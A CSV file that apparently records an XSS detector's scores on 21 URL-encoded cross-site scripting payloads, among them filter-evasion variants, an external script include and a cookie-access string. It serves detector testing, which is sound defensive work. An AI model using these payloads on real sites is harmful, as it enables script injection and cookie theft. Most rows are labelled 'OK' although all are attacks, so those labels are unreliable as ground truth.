sentence,result,threshold
%26lt%3BIMG%20SRC%3D%22%20%26amp%3B%2314%3B%20%20javascript%3Aalert%281%29%3B%22%26gt%3B,OK,0.00619754195
vbscr%26Tab%3Bipt%3Aalert%281%29%22,OK,0.129739821
%3Cbody%20onunload%20body%20onunload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onunload%3E,OK,0.0285078883
%27%3E%3Cimg%20src%3Dx%20onerror%3D%5Cx12%22javascript%3Aalert%281%29%22%3E,OK,0.00241038203
this%5B%22%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%22%5D%5B%22cookie%22%5D,OK,0.113146693
%3C/ScrIpt%3E%3CSCRIPT%3Ealert%281%29%3B%3C/SCRIPT%3E,OK,0.0839524269
%27%3E%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A//www.w3.org/1999/xhtml%22%3Ealert%281%29%3B%3C/x%3Ascript%3E,OK,0.00644630194
%22%3E%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3B%20url%3Ddata%3Atext/html%3Bblabla%2C%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%22%3E,OK,0.00663048029
%3CSCRIPT%20SRC%3Dhttp%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%3C%20B%20%3E,XSS ATTACK,0.804849863
%22%3E%3Cstyle%3E%3Cimg%20src%3D%22%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%22%3E,OK,0.0161502361
%3Cdiv%20style%3D%22list-style%3Aurl%28http%3A//foo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX,OK,0.000843435526
%27%3E%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E,OK,0.014262408
%3Ci%5B%2500%5Dm%5B%2500%5Dg%20o%5B%2500%5Dner%5B%2500%5Dr%5B%2500%5Dor%5B%2500%5D%3Da%5B%2500%5Dler%5B%2500%5Dt%281%29%20sr%5B%2500%5Dc%3D%5B%2500%5Da%3E,OK,0.0921785533
%26lt%3BXML%20ID%3DI%26gt%3B%26lt%3BX%26gt%3B%26lt%3BC%26gt%3B%26lt%3B%21%5BCDATA%5B%26lt%3BIMG%20SRC%3D%22javas%5D%5D%26gt%3B%26lt%3B%21%5BCDATA%5Bcript%3Aalert%281%29%3B%22%26gt%3B%5D%5D%26gt%3B,OK,0.00791725516
%22%3E%3Cform%20id%3Dtest%20/%3E%3Cbutton%20form%3Dtest%20formaction%3Djavascript%3Aalert%281%29%3E,OK,0.00286158919
%27%3E%3CIMG%20SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E,OK,0.0245282352
%3C%21--%3Cimg%20src%3D%22--%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29//%22%3E,OK,0.00319734216
%3C/ScrIpt%3E%3Cscript%3E%28%7Bset/%2A%2A/%24%28%24%29%7B_/%2A%2A/setter%3D%24%2C_%3D1%7D%7D%29.%24%3Dalert%3C/script%3E,OK,0.0112947226
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%27%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.478938371
%27%3E%3Cstyle%3E%3C/style%5Cx09%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,OK,0.00633040071
%22%3E%3Cimg%5Ba%5D%5Bb%5D%5Bc%5Dsrc%5Bd%5D%3Dx%5Be%5Donerror%3D%5Bf%5D%22alert%281%29%22%3E,OK,0.00789758563
